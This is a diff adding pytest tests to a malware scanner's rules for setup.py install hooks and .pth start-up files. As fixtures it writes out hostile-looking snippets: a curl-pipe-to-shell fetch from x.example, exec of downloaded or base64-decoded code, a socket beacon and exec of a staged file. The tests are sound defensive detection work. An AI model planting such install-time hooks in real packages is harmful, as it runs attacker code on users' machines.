@@ -235,3 +235,144 @@ async def test_malware_scan_runs_the_new_checks(tmp_path: Path) -> None:
         "malware-cloud-metadata-access",
     } <= ids
     assert result.errors == []
+
+
+# ── #139 Python install-time execution ─────────────────────────────────────────
+
+SETUP_HEADER = "from setuptools import setup\nfrom setuptools.command.install import install\n"
+
+
+def _setup(body: str) -> dict[str, tuple[Severity, int]]:
+    return {
+        f.rule_id: (f.severity, f.line)
+        for f in sc.setup_py_findings(SETUP_HEADER + body, "setup.py")
+    }
+
+
+@pytest.mark.parametrize(
+    "run_body",
+    [
+        J("        os.sys", "tem('cu", "rl -s https://x.example/p | sh')"),
+        "        subprocess.check_call(['bash', '-c', payload])",
+        "        exec(urllib.request.urlopen(URL).read())",
+        J("        exec(base64.b64", "decode(BLOB))"),
+    ],
+)
+def test_install_override_that_runs_code_is_high(run_body: str) -> None:
+    body = (
+        "class PostInstall(install):\n"
+        "    def run(self):\n"
+        "        install.run(self)\n"
+        f"{run_body}\n"
+        "setup(name='x', cmdclass={'install': PostInstall})\n"
+    )
+    found = _setup(body)
+    assert found["malware-setup-py-install-exec"] == (Severity.HIGH, 3)
+
+
+def test_plain_install_override_is_a_low_confidence_review() -> None:
+    body = (
+        "class CustomInstall(install):\n"
+        "    def run(self):\n"
+        "        self.announce('compiling translations')\n"
+        "        install.run(self)\n"
+    )
+    found = sc.setup_py_findings(SETUP_HEADER + body, "setup.py")
+    assert [(f.rule_id, f.severity, f.confidence) for f in found] == [
+        ("malware-setup-py-install-hook", Severity.MEDIUM, "low")
+    ]
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        # native build steps run compilers: normal
+        "import setuptools.command.build_ext\n"
+        "class build_ext(setuptools.command.build_ext.build_ext):\n"
+        "    def run(self):\n"
+        "        subprocess.check_call(['cmake', '--build', '.'])\n"
+        "        self.compiler.compile(sources)\n",
+        "setup(name='x', version='1.0', packages=['x'])\n",
+        "class Helper:\n    def run(self):\n        exec(code)\n",  # not a setuptools command
+        "def broken(:\n",  # unparsable: ignored, never executed
+    ],
+)
+def test_ordinary_setup_py_is_quiet(body: str) -> None:
+    assert sc.setup_py_findings(SETUP_HEADER + body, "setup.py") == []
+
+
+def test_build_override_that_downloads_code_is_high() -> None:
+    body = (
+        "from setuptools.command.build_py import build_py as _build_py\n"
+        "class BuildPy(_build_py):\n"
+        "    def run(self):\n"
+        "        data = urllib.request.urlopen(URL).read()\n"
+    )
+    assert "malware-setup-py-install-exec" in _setup(body)
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        J("import os; exec(__import__('base64').b64", "decode('cHJpbnQoMSk='))"),
+        "import subprocess; subprocess.Popen(['python', '-c', 'x'])",
+        "import urllib.request as u; u.urlopen('https://x.example/beacon')",
+        # a fixed string is judged by what it runs
+        "import sys; exec('import socket; socket.create_connection((\"x.example\", 443))')",
+        "import sys; exec(open('/tmp/stage2').read())",
+    ],
+)
+def test_pth_that_runs_code_is_high(line: str) -> None:
+    findings = sc.pth_findings(f"/some/path\n{line}\n", "site-packages/evil.pth")
+    assert [(f.rule_id, f.severity, f.line) for f in findings] == [
+        ("malware-pth-code-exec", Severity.HIGH, 2)
+    ]
+
+
+def test_pth_plain_import_is_low_review_and_paths_are_ignored() -> None:
+    findings = sc.pth_findings(
+        "/opt/lib\n../src\nimport my_plugin_hook\n", "site-packages/plugin.pth"
+    )
+    assert [(f.rule_id, f.severity, f.confidence) for f in findings] == [
+        ("malware-pth-import", Severity.LOW, "low")
+    ]
+
+
+@pytest.mark.parametrize(
+    ("name", "text"),
+    [
+        (
+            "distutils-precedence.pth",
+            "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') "
+            "== 'local'; enabled and __import__('_distutils_hack').add_shim(); \n",
+        ),
+        ("_virtualenv.pth", "import _virtualenv\n"),
+        (
+            "a1_coverage.pth",  # coverage.py / pytest-cov: exec of a fixed start-up snippet
+            'import sys; exec(\'import os\\n\\nif os.getenv("COVERAGE_PROCESS_START"):\\n try:\\n  '
+            'import coverage\\n except:\\n  pass\\n else:\\n  coverage.process_startup(slug="pth")\')\n',
+        ),
+        (
+            "__editable___mypkg_0_1_finder.pth",
+            "import __editable___mypkg_0_1_finder; __editable___mypkg_0_1_finder.install()\n",
+        ),
+        ("mypkg-1.0-nspkg.pth", "import sys, types, os;has_mfs = sys.version_info > (3, 5)\n"),
+    ],
+)
+def test_standard_tooling_pth_files_are_quiet(name: str, text: str) -> None:
+    assert sc.pth_findings(text, f"site-packages/{name}") == []
+
+
+@pytest.mark.asyncio
+async def test_malware_scan_includes_setup_py_and_pth(tmp_path: Path) -> None:
+    (tmp_path / "setup.py").write_text(
+        SETUP_HEADER
+        + "class P(install):\n    def run(self):\n        exec(urllib.request.urlopen(U).read())\n"
+    )
+    (tmp_path / "lib").mkdir()
+    (tmp_path / "lib" / "hook.pth").write_text(
+        J("import os; exec(__import__('base64').b64", "decode('eA=='))\n")
+    )
+    result = await run_malware_scan(str(tmp_path))
+    ids = {f.rule_id for f in result.findings}
+    assert {"malware-setup-py-install-exec", "malware-pth-code-exec"} <= ids
